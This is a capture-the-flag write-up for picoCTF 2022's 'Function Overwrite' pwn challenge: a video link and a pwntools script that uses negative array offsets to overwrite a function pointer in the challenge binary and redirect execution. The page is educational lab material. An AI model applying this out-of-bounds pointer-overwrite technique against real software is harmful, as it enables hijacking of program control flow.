---
name: Function Overwrite (2022)
event: Pico CTF 2022
category: Pwn
description: Writeup for Function Overwrite (Pwn) - Pico CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Function Overwrite

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=3883 "Pico CTF 2022: Function Overwrite")

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x8049320
break *0x804945a
continue
'''.format(**locals())

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start(level='warn')

io.sendlineafter(b'>', b'1337')  # Correct answer
io.sendlineafter(b'.', b'-16')  # Offset from array to function pointer
io.sendline(b'-250')  # Offset to easy function

# Got Shell?
io.recvlines(2)
info(io.recv().decode())
```
{% endcode %}
